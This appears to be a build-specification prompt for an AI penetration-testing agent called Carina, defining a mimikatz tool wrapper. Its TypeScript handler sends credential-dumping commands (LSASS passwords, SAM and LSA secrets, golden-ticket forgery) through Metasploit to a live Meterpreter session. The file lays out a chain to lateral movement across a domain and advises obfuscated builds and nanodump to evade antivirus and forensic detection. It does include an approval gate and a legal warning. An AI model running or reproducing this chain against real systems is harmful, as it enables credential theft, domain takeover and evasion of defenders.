# Tool: mimikatz | #25 | Windows Credential Extraction


## Post-build (MANDATORY)

When all "Done When" criteria in this prompt are satisfied:

1. Add `**Status: COMPLETED YYYY-MM-DD**` at the top of this file (use today's date).
2. Add a "**What was built:**" bullet list of key files or features shipped.
3. Move this file from `carina/internal/prompts/pending_prompts/` to `carina/internal/prompts/archived_prompts/pending_prompts/`, keeping the same relative path. Use `git mv` when possible.
4. If every prompt in this gap folder is COMPLETED, move the whole gap folder and update its `README.md` the same way.
5. Do not leave completed prompts in `pending_prompts/`; agents treat that folder as active work only.

Full checklist: `carina/internal/prompts/pending_prompts/POST-BUILD-CHECKLIST.md`

## Metadata
- **Priority:** MEDIUM
- **Source:** Kali Linux
- **Binary:** `mimikatz` (PowerShell: `Invoke-Mimikatz`)
- **Package:** `mimikatz`
- **Risk Level:** critical
- **Requires Human Approval:** yes (credential theft)
- **OS Compatibility:** kali, parrot

## Purpose
Windows credential extraction tool. Dumps plaintext passwords, NTLM hashes, Kerberos tickets, and PINs from LSASS memory. Supports pass-the-hash, pass-the-ticket, golden/silver ticket attacks, and DPAPI decryption. Carina uses Mimikatz for post-exploitation credential harvesting and persistence.

## Carina CLI Command
```
carina exploit mimikatz <session-id> --module <sekurlsa|kerberos|lsadump|dpapi> [--command "<custom>"]
```

## TypeScript Wrapper

```typescript
export const mimikatzTool: ToolDefinition = {
  name: 'mimikatz_dump',
  description: 'Windows credential extraction; passwords, hashes, tickets, DPAPI.',
  parameters: {
    sessionId: { type: 'number', description: 'Meterpreter session ID', required: true },
    module:    { type: 'enum', values: ['sekurlsa', 'kerberos', 'lsadump', 'dpapi', 'vault', 'all'], default: 'all' },
    command:   { type: 'string', description: 'Raw mimikatz command', required: false },
  },
  requires: ['meterpreter_session'],
  risk: 'critical',
  category: 'exploit',
  requiresApproval: true,
  handler: async (params, ctx) => {
    await ctx.requestApproval('Mimikatz credential extraction from live session');
    const msf = await connectMsfRpc();
    let commands: string[];
    if (params.command) {
      commands = [params.command];
    } else if (params.module === 'all') {
      commands = ['sekurlsa::logonpasswords', 'sekurlsa::tickets /export', 'lsadump::sam', 'lsadump::secrets', 'vault::list'];
    } else {
      const cmds: Record<string, string[]> = {
        sekurlsa: ['sekurlsa::logonpasswords', 'sekurlsa::ekeys', 'sekurlsa::tickets /export'],
        kerberos: ['kerberos::list /export', 'kerberos::golden /user:Administrator /domain:DOMAIN /sid:S-1-5-21-... /krbtgt:HASH /id:500'],
        lsadump:  ['lsadump::sam', 'lsadump::secrets', 'lsadump::cache'],
        dpapi:    ['dpapi::masterkey', 'dpapi::cred'],
        vault:    ['vault::list', 'vault::cred /patch'],
      };
      commands = cmds[params.module] || [];
    }
    const results = [];
    for (const cmd of commands) {
      const result = await msf.call('session.meterpreter_run_single', [params.sessionId, cmd]);
      results.push({ command: cmd, output: result });
    }
    return { sessionId: params.sessionId, results };
  },
};
```

## Modules
| Module | Command | Output |
|--------|---------|--------|
| sekurlsa | sekurlsa::logonpasswords | Plaintext passwords, NTLM hashes |
| sekurlsa | sekurlsa::tickets | Kerberos tickets (.kirbi) |
| kerberos | kerberos::golden | Golden ticket for domain persistence |
| lsadump | lsadump::sam | Local SAM hashes |
| lsadump | lsadump::secrets | LSA secrets (service account passwords) |
| dpapi | dpapi::cred | DPAPI-protected credentials |
| vault | vault::cred | Windows Vault credentials |

## Workflow Chains
```
UPSTREAM:   18-metasploit (SYSTEM session), 23-evil-winrm (admin shell)
DOWNSTREAM: 24-crackmapexec (use dumped hashes for lateral movement)
CHAINS:     metasploit → mimikatz → crackmapexec (domain compromise chain)
```

## Pitfalls
1. **AV/EDR detection**; mimikatz is the most signatured tool in existence; use obfuscated variants
2. **LSASS protection**; Windows Defender Credential Guard blocks sekurlsa; needs LSA dump workaround
3. **Admin/SYSTEM required**; most commands need elevated privileges
4. **Memory artifact**; mimikatz leaves forensic traces in LSASS memory; use nanodump for stealth
5. **Legal boundary**; credential dumping on production without authorization is a crime

## Verification
```bash
# mimikatz is deployed via meterpreter, not installed on attacker machine
msfconsole -q -x "use auxiliary/gather/windows_deployment; run"
```
